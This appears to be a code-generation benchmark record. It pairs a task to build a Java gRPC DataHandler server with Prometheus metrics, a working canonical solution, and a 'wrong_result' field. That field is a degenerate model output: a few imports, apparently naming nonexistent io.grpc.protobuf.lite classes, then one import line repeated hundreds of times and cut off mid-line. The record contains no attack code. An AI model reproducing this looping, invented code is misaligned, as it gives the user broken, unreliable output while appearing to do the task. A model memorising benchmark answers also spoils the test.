    "Instruction": "Task Description: Create a gRPC server in Java that handles data requests, including synchronous, streaming, and bidirectional streaming operations, with Prometheus monitoring integration.\n\nClass Description: DataHandler is a gRPC server implementation that processes various types of data requests. It includes metrics collection through Prometheus and provides three main service methods for data operations.\n\nAttributes:\n- LOG: [Logger] - Logger instance for server operations logging\n- PORT: [int] - Port number for the gRPC server (1111)\n- syncRequests: [Counter] - Prometheus counter for tracking synchronous requests\n- streamingRequests: [Counter] - Prometheus counter for tracking streaming requests\n- grpcServer: [Server] - gRPC server instance\n- prometheusHttpServer: [HTTPServer] - Prometheus HTTP server for metrics exposure\n\nMethods:\n- start() -> [void] - Initializes and starts the gRPC server with Prometheus monitoring interceptor\n- blockUntilShutdown() -> [void] - Blocks the main thread until server shutdown\n- stop() -> [void] - Gracefully shuts down the gRPC server\n\nNested Class: DataImpl extends DataServiceGrpc.DataServiceImplBase and implements three service methods:\n- get([DataRequest], [StreamObserver<DataResponse>]) -> [void] - Handles synchronous data requests (converts input to uppercase)\n- streamingGet([EmptyRequest], [StreamObserver<DataResponse>]) -> [void] - Streams 10 sequential responses\n- streamingPut([StreamObserver<DataRequest>]) -> [StreamObserver<DataResponse>] - Handles bidirectional streaming (modifies and collects input data)",
    "Canonical_solution": "import colossus.data.Data;\nimport colossus.data.DataServiceGrpc;\nimport io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport io.grpc.ServerInterceptors;\nimport io.grpc.stub.StreamObserver;\nimport io.prometheus.client.CollectorRegistry;\nimport io.prometheus.client.Counter;\nimport io.prometheus.client.exporter.HTTPServer;\nimport me.dinowernli.grpc.prometheus.Configuration;\nimport me.dinowernli.grpc.prometheus.MonitoringServerInterceptor;\n\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.logging.Logger;\nimport java.util.stream.IntStream;\n\npublic class DataHandler {\n    private static final Logger LOG = Logger.getLogger(DataHandler.class.getName());\n    private static final int PORT = 1111;\n    private static final Counter syncRequests = Counter.build()\n            .name(\"data_svc_sync_requests\")\n            .help(\"Sync requests to the data service\")\n            .labelNames(\"request_key\")\n            .register();\n\n    private static final Counter streamingRequests = Counter.build()\n            .name(\"data_svc_streaming_requests\")\n            .help(\"Streaming requests to the data service\")\n            .register();\n\n    private Server grpcServer;\n    private static HTTPServer prometheusHttpServer;\n\n    static class DataImpl extends DataServiceGrpc.DataServiceImplBase {\n        private static final Logger LOG = Logger.getLogger(DataImpl.class.getName());\n\n        @Override\n        public void get(Data.DataRequest req, StreamObserver<Data.DataResponse> resObserver) {\n            String request = req.getRequest();\n            LOG.info(String.format(\"Request received for the string: \\\"%s\\\"\", request));\n            String computedValue = request.toUpperCase();\n            LOG.info(String.format(\"Computed value: \\\"%s\\\"\", computedValue));\n            Data.DataResponse res = Data.DataResponse.newBuilder()\n                    .setValue(computedValue)\n                    .build();\n\n            syncRequests.labels(request).inc();\n\n            resObserver.onNext(res);\n            resObserver.onCompleted();\n        }\n\n        @Override\n        public void streamingGet(Data.EmptyRequest req, StreamObserver<Data.DataResponse> resObserver) {\n            LOG.info(\"Request received for streaming data\");\n\n            Data.DataResponse.Builder resBldr = Data.DataResponse.newBuilder();\n\n            IntStream.range(0, 10).forEach(i -> {\n                String value = String.format(\"Response %d\", i);\n\n                streamingRequests.inc();\n\n                resObserver.onNext(resBldr.setValue(value).build());\n            });\n\n            resObserver.onCompleted();\n        }\n\n        @Override\n        public StreamObserver<Data.DataRequest> streamingPut(final StreamObserver<Data.DataResponse> resObserver) {\n            return new StreamObserver<Data.DataRequest>() {\n                private List<String> items = new ArrayList<>();\n\n                @Override\n                public void onNext(Data.DataRequest req) {\n                    items.add(req.getRequest().replace(\"f\", \"9\").toUpperCase());\n                }\n\n                @Override\n                public void onError(Throwable t) {\n                    resObserver.onError(t);\n                }\n\n                @Override\n                public void onCompleted() {\n                    Data.DataResponse res = Data.DataResponse.newBuilder()\n                            .setValue(items.toString())\n                            .build();\n\n                    resObserver.onNext(res);\n                    resObserver.onCompleted();\n                }\n            };\n        }\n    }\n\n    private void start() throws IOException {\n        Configuration monitoringConfig = Configuration.cheapMetricsOnly();\n        MonitoringServerInterceptor prometheusInterceptor = MonitoringServerInterceptor.create(\n            monitoringConfig.withCollectorRegistry(new CollectorRegistry()));\n\n        grpcServer = ServerBuilder.forPort(PORT)\n            .addService(ServerInterceptors.intercept(new DataImpl().bindService(), prometheusInterceptor))\n            .build()\n            .start();\n        LOG.info(String.format(\"gRPC server successfully started on port %d\", PORT));\n    }\n\n    private void blockUntilShutdown() throws InterruptedException {\n        if (grpcServer != null) {\n            grpcServer.awaitTermination();\n        }\n    }\n\n    private void stop() {\n        if (grpcServer != null) grpcServer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 24,
    "wrong_result": "```java\nimport io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport io.grpc.netty.NettyServerBuilder;\nimport io.grpc.stub.StreamObserver;\nimport io.grpc.protobuf.lite.ScopedDescriptorTable;\nimport io.grpc.protobuf.lite.ProtoFile;\nimport io.grpc.protobuf.lite.DescriptorProtobuf;\nimport io.grpc.protobuf.lite.ProtoReflectionHelper;\nimport io.grpc.protobuf.lite.ProtoReflectionService;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport 